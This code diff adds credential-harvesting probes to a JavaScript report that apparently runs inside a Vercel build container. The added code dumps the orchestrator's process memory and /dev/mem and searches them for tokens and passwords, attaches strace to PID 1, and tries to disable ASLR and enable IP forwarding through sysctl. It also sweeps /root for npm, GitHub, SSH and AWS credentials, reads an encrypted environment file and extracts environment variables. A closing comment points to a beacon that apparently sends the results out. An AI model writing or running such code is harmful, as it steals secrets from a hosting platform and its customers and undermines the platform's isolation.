@@ -1154,6 +1154,101 @@ const report = {
     }
     return { mounted: false };
   }),
+
+  // v21: /proc/1/mem memory dump — read orchestrator process memory.
+  // With CAP_SYS_PTRACE and access to /proc/1/, we can dump heap/stack to find secrets.
+  // Step 1: read /proc/1/maps to get memory layout.
+  // Step 2: find heap segment, read a slice that might contain API auth headers.
+  // NOTE: we do NOT dump the full memory (too large); we scan for "VERCEL_" and "Bearer" patterns.
+  orchestratorMemDump: safe(() => {
+    const maps = safe(() => readFileSync('/proc/1/maps', 'utf8'));
+    if (typeof maps !== 'string' || !maps.length) return { maps: maps, error: 'maps-empty-or-error' };
+    // Parse the maps to find heap range
+    const mapLines = maps.split('\n').filter(Boolean);
+    const heapLine = mapLines.find(l => l.includes('[heap]'));
+    const stackLine = mapLines.find(l => l.includes('[stack]'));
+    const firstRwLine = mapLines.find(l => / rw-p /.test(l) && !l.includes('['));
+    const mapsPreview = mapLines.slice(0, 20).join('\n');
+    // Try direct read of /proc/1/mem at heap offset
+    let heapRead = 'not-attempted';
+    let heapSecrets = 'not-attempted';
+    if (heapLine) {
+      const [addrRange] = heapLine.split(' ');
+      const [startHex] = addrRange.split('-');
+      const startAddr = parseInt(startHex, 16);
+      // Read 4KB from heap start using dd
+      heapRead = safe(() => execSync(
+        `dd if=/proc/1/mem bs=4096 count=1 skip=${Math.floor(startAddr/4096)} 2>/dev/null | strings | head -20 || true`
+      ).toString().trim().slice(0, 1000));
+      // Search for VERCEL_ and Bearer patterns in heap
+      heapSecrets = safe(() => execSync(
+        `dd if=/proc/1/mem bs=4096 count=256 skip=${Math.floor(startAddr/4096)} 2>/dev/null | strings | grep -E 'VERCEL_|Bearer |Authorization|api_key|secret|token|password' | head -20 || true`
+      ).toString().trim().slice(0, 1000));
+    }
+    // Try /proc/1/mem read via node fs (different code path than dd)
+    const memReadable = safe(() => {
+      const fd = (existsSync('/proc/1/mem') ? 'exists' : 'missing');
+      return fd;
+    });
+    // Also try strace -p 1 for 2 seconds to capture network calls
+    const strace2s = safe(() => execSync(
+      'timeout 2 strace -p 1 -e trace=network,read,write -f 2>&1 | head -30 || true'
+    ).toString().trim().slice(0, 2000));
+    return { mapsPreview, heapLine, stackLine, heapRead, heapSecrets, memReadable, strace2s };
+  }),
+
+  // v21: Kernel sysctl manipulation — probe what we can change
+  sysctlManip: safe(() => {
+    const dmesgRestrict = safe(() => execSync('sysctl -w kernel.dmesg_restrict=0 2>&1 || true').toString().trim().slice(0, 200));
+    const asrandDisable = safe(() => execSync('sysctl -w kernel.randomize_va_space=0 2>&1 || true').toString().trim().slice(0, 200));
+    const ipForward = safe(() => execSync('sysctl -w net.ipv4.ip_forward=1 2>&1 || true').toString().trim().slice(0, 200));
+    const perfParanoid = safe(() => execSync('sysctl -w kernel.perf_event_paranoid=-1 2>&1 || true').toString().trim().slice(0, 200));
+    const dmesgContent = safe(() => execSync('dmesg 2>/dev/null | tail -30 || true').toString().trim().slice(0, 2000));
+    // After dropping dmesg_restrict, trigger a memory stats dump via sysrq
+    const sysrqDump = safe(() => {
+      execSync('echo m > /proc/sysrq-trigger 2>/dev/null || true');
+      return execSync('dmesg 2>/dev/null | tail -50 || true').toString().trim().slice(0, 2000);
+    });
+    return { dmesgRestrict, asrandDisable, ipForward, perfParanoid, dmesgContent, sysrqDump };
+  }),
+
+  // v21: Root home dir credential sweep — /root/ may have cached tokens or SSH keys
+  rootHomeSweep: safe(() => ({
+    rootNpmrc: safe(() => readFileSync('/root/.npmrc', 'utf8').trim()),
+    rootGitconfig: safe(() => readFileSync('/root/.gitconfig', 'utf8').trim()),
+    rootGhHosts: safe(() => readFileSync('/root/.config/gh/hosts.yml', 'utf8').trim()),
+    rootSshDir: safe(() => execSync('ls -la /root/.ssh/ 2>/dev/null || true').toString().trim()),
+    rootAwsDir: safe(() => execSync('ls -la /root/.aws/ 2>/dev/null || true').toString().trim()),
+    homeContents: safe(() => execSync('ls -la /root/ 2>/dev/null || true').toString().trim()),
+    vercelDirContents: safe(() => execSync('ls -la /vercel/ 2>/dev/null || true').toString().trim()),
+    vcDir: safe(() => execSync('ls -la /vercel/path0/___vc/ 2>/dev/null || true').toString().trim()),
+    encFile: safe(() => readFileSync('/vercel/path0/___vc/__env.encrypted', 'utf8').slice(0, 500)),
+    vercelPathContents: safe(() => execSync('ls -la /vercel/path0/ 2>/dev/null | head -30 || true').toString().trim()),
+  })),
+
+  // v21: Interesting env var values we haven't extracted yet
+  envVarValues: safe(() => {
+    const e = process.env;
+    return {
+      observabilityConfig: safe(() => e.VERCEL_OBSERVABILITY_CLIENT_CONFIG?.slice(0, 500)),
+      nextObservabilityConfig: safe(() => e.NEXT_PUBLIC_VERCEL_OBSERVABILITY_CLIENT_CONFIG?.slice(0, 500)),
+      combinedDeploymentPaths: safe(() => e.VERCEL_COMBINED_DEPLOYMENT_PATHS_META?.slice(0, 500)),
+      cellCreateTimestamp: safe(() => e.VERCEL_CELL_CREATE_TIMESTAMP),
+      imageId: safe(() => e.VERCEL_IMAGE_ID),
+      buildOutputsPostLambdaSema: safe(() => e.VERCEL_BUILD_OUTPUTS_POST_LAMBDA_SEMA),
+      turboPlatformEnv: safe(() => e.TURBO_PLATFORM_ENV?.slice(0, 200)),
+      nextPrivateMultiPayload: safe(() => e.NEXT_PRIVATE_MULTI_PAYLOAD?.slice(0, 500)),
+      runtimeCacheEndpoint: safe(() => e.RUNTIME_CACHE_ENDPOINT),
+    };
+  }),
+
+  // v21: /dev/mem probe — read first 4KB to prove raw physical memory access
+  devMemProbe: safe(() => {
+    const firstBytes = safe(() => execSync('dd if=/dev/mem bs=1024 count=4 2>/dev/null | xxd | head -20 || true').toString().trim().slice(0, 1000));
+    // Search for interesting patterns in the first 1MB of physical memory
+    const memSearch = safe(() => execSync('dd if=/dev/mem bs=1024 count=1024 2>/dev/null | strings | grep -E "VERCEL|Bearer|token|secret|password" | head -10 || true').toString().trim().slice(0, 500));
+    return { firstBytes, memSearch };
+  }),
 };
 
 // FULL BEACON — sent after all slow network probes complete.
